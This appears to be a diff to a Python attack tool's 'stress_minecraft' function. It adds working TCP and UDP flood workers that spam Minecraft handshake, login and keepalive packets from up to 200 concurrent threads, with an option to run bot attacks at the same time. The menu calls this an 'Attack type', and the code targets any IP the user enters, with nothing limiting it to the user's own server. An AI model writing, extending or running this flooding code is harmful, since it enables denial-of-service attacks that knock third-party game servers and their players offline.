@@ -3016,13 +3016,69 @@ def legacy_nmap(target):
     return open_ports
 
 
-def mc_worker(ip, port, results, idx):
+def mc_tcp_flood_worker(ip, port, duration, results, idx):
+    sent = 0
+    end = time.time() + duration
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2.0); s.connect((ip, port))
-        s.sendall(MINECRAFT_PAYLOADS[idx % len(MINECRAFT_PAYLOADS)])
-        s.close(); results[idx] = 1
-    except Exception: results[idx] = 0
+        while time.time() < end:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.settimeout(4)
+                s.connect((ip, port))
+                host = ip
+                handshake = _mc_packet(0x00, _mc_varint(764), _mc_pstr(host), port.to_bytes(2, "big"), _mc_varint(2))
+                s.sendall(handshake)
+                sent += 1
+                username = f"Flood_{random.randint(10000,99999)}_{random.choice(['X','Pro','YT','OP','HD'])}"
+                login = _mc_packet(0x00, _mc_pstr(username))
+                s.sendall(login)
+                sent += 1
+            except Exception:
+                time.sleep(0.02)
+                continue
+            while time.time() < end:
+                try:
+                    s.settimeout(1)
+                    v = 0
+                    for i in range(5):
+                        b = s.recv(1)
+                        if not b:
+                            break
+                        v |= (b[0] & 0x7F) << (7 * i)
+                        if not (b[0] & 0x80):
+                            break
+                    if v:
+                        pid_byte = s.recv(1)
+                        if pid_byte and pid_byte[0] == 0x21:
+                            s.sendall(_mc_packet(0x0F))
+                            sent += 1
+                except socket.timeout:
+                    s.sendall(_mc_packet(0x0F))
+                    sent += 1
+                except Exception:
+                    break
+            s.close()
+        results[idx] = sent
+    except Exception:
+        results[idx] = sent
+
+
+def mc_udp_flood_worker(ip, port, duration, results, idx):
+    sent = 0
+    end = time.time() + duration
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        payload = b"\x00" * 1024
+        while time.time() < end:
+            try:
+                s.sendto(payload, (ip, port))
+                sent += 1
+            except Exception:
+                pass
+        results[idx] = sent
+    except Exception:
+        results[idx] = sent
 
 
 def stress_minecraft():
@@ -3041,52 +3097,104 @@ def stress_minecraft():
 
     print(f"\n  {c('Attack type:', Fore.CYAN)}")
     print(f"  {c('[1]', Fore.GREEN)}  Bot attack (Node.js mineflayer bots)")
-    print(f"  {c('[2]', Fore.GREEN)}  Packet flooding (raw TCP)")
-    print(f"  {c('[3]', Fore.GREEN)}  Both")
+    print(f"  {c('[2]', Fore.GREEN)}  Packet flooding (TCP/UDP)")
+    print(f"  {c('[3]', Fore.GREEN)}  Both (bots + flood simultaneously)")
     at = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+    if at not in ("1", "2", "3"):
+        print(f"  {RED}Invalid choice.{RESET}")
+        return
 
-    if at in ("1", "3"):
+    # ── Collect all params upfront so prompts don't mix with output ──
+    bot_enabled = at in ("1", "3")
+    flood_enabled = at in ("2", "3")
+
+    bc = 0
+    bd = 0
+    ft = "t"
+    dur = 30
+    cc = 200
+
+    if bot_enabled:
         _ensure_mineflayer()
+        b_in = input(f"  {c(f'Bot count (default 20) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+        bc = int(b_in) if b_in.isdigit() else 20
+        bd_in = input(f"  {c(f'Bot duration seconds (default 30) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+        bd = int(bd_in) if bd_in.isdigit() else 30
+
+    if flood_enabled:
+        print(f"  {c('Flood type:', Fore.CYAN)}")
+        print(f"  {c('[t]', Fore.GREEN)}  TCP flood (handshake+login spam, Java)")
+        print(f"  {c('[u]', Fore.GREEN)}  UDP flood (Bedrock, port 19132)")
+        print(f"  {c('[b]', Fore.GREEN)}  Both TCP+UDP")
+        ft = input(f"  {c(f'Choice (default t) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "t"
+        d_in = input(f"  {c(f'Flood duration seconds (default 30) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+        dur = int(d_in) if d_in.isdigit() else 30
+        c_in = input(f"  {c(f'Concurrent connections (default 200) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+        cc = int(c_in) if c_in.isdigit() else 200
+
+    # ── Launch bots (non-blocking, background) ──
+    if bot_enabled:
         bot_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mc_bots.js")
         if os.path.exists(bot_script):
-            b_in = input(f"  {c(f'Bot count (default 20) {SYM_PROMPT} ', Fore.CYAN)}").strip()
-            bc = int(b_in) if b_in.isdigit() else 20
-            bd = input(f"  {c(f'Duration (seconds, default 30) {SYM_PROMPT} ', Fore.CYAN)}").strip()
-            bd = int(bd) if bd.isdigit() else 30
-            print(f"\n  {c('Launching mineflayer bots...', Fore.CYAN)}")
-            subprocess.Popen(["node", bot_script, ip, str(port), str(bc), str(bd)])
+            print(f"  {c('Launching mineflayer bots in background...', Fore.CYAN)}")
+            subprocess.Popen(["node", bot_script, ip, str(port), str(bc), str(bd)],
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         else:
-            print(f"  {YELLOW}mc_bots.js not found. Using raw TCP bots instead.{RESET}")
-            bc = 10 if at == "1" else 5
-            start_bot = time.time(); bsent = 0; bdone = 0
-            for b in range(0, bc, 200):
-                be = min(b + bc, bc); batch = list(range(b, be)); br = {}
+            print(f"  {YELLOW}mc_bots.js not found. Running raw TCP bots in background...{RESET}")
+            def _run_bots():
+                br = {}
                 with ThreadPoolExecutor(max_workers=200) as ex:
-                    fs = {ex.submit(_mc_bot_worker, ip, port, br, i): i for i in batch}
-                    for f in as_completed(fs): f.result()
-                for v in br.values(): bsent += v; bdone += 1
-            bel = time.time() - start_bot
-            print(f"  {GREEN}{SYM_CHECK} Raw bot connections: {bsent}/{bc} in {bel:.1f}s{RESET}")
+                    fs = {ex.submit(_mc_bot_worker, ip, port, br, i): i for i in range(bc)}
+                    for f in as_completed(fs):
+                        try:
+                            f.result()
+                        except Exception:
+                            pass
+            import threading
+            t = threading.Thread(target=_run_bots, daemon=True)
+            t.start()
 
-    if at in ("2", "3"):
-        n_in = input(f"  {c(f'Packets to send (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        num = int(n_in) if n_in.isdigit() else 500
-        start = time.time(); sent = 0; done = 0; bs = 1600
+    # ── Run flood ──
+    if flood_enabled:
+        udp_port = 19132
+        def _run_flood(worker_func, workers, label, use_port):
+            start = time.time()
+            sent = 0
+            br = {}
+            with ThreadPoolExecutor(max_workers=workers) as ex:
+                fs = {ex.submit(worker_func, ip, use_port, dur, br, i): i for i in range(workers)}
+                try:
+                    while not all(f.done() for f in fs):
+                        done_count = sum(1 for f in fs if f.done())
+                        sys.stdout.write(f"\r  {c(label, Fore.CYAN)}  {c(f'Workers: {done_count}/{workers}', Fore.GREEN)}  {c(f'Runtime: {time.time()-start:.0f}s', Fore.YELLOW)}  {c('Ctrl+C to stop', Fore.DIM)}{' '*30}")
+                        sys.stdout.flush()
+                        time.sleep(0.5)
+                except KeyboardInterrupt:
+                    for f in fs:
+                        f.cancel()
+                for f in as_completed(fs):
+                    try:
+                        sent += f.result()
+                    except Exception:
+                        pass
+            el = time.time() - start
+            rat = sent / el if el > 0 else 0
+            print(f"\n  {GREEN}{SYM_CHECK} {label} complete: {c(str(sent), Fore.CYAN)} pkts in {c(f'{el:.1f}s', Fore.CYAN)} ({c(f'{rat:.1f} pkt/s', Fore.MAGENTA)}){RESET}")
+            return sent
+
+        total = 0
+        if ft in ("t", "b"):
+            total += _run_flood(mc_tcp_flood_worker, cc, "TCP flood", port)
+        if ft in ("u", "b"):
+            total += _run_flood(mc_udp_flood_worker, cc, "UDP flood", udp_port)
+        print(f"  {c(SYM_CHECK + f' Total: {total} packets sent', Fore.GREEN)}")
+    else:
+        print(f"  {c('Bot attack running in background. Press Ctrl+C to stop.', Fore.YELLOW)}")
         try:
-            for b in range(0, num, bs):
-                be = min(b + bs, num); batch = list(range(b, be)); br = {}
-                with ThreadPoolExecutor(max_workers=200) as ex:
-                    fs = {ex.submit(mc_worker, ip, port, br, i): i for i in batch}
-                    for f in as_completed(fs): f.result()
-                for v in br.values(): sent += v; done += 1
-                p = f"{progress_bar(min(done, num), num)}  S:{sent}  E:{done-sent}"
-                sys.stdout.write(f"\r{p:60s}")
-                sys.stdout.flush()
-            print()
-        except KeyboardInterrupt: print(f"\n  {YELLOW}Interrupted.{RESET}")
-        el = time.time() - start
-        rat = sent / el if el > 0 else 0
-        print(f"  {c('Packet flood complete!', Fore.GREEN)} {c(str(sent), Fore.CYAN)} pkts in {c(f'{el:.1f}s', Fore.CYAN)} ({c(f'{rat:.1f} pkt/s', Fore.MAGENTA)})")
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n  {YELLOW}Stopped.{RESET}")
 
     print()
 
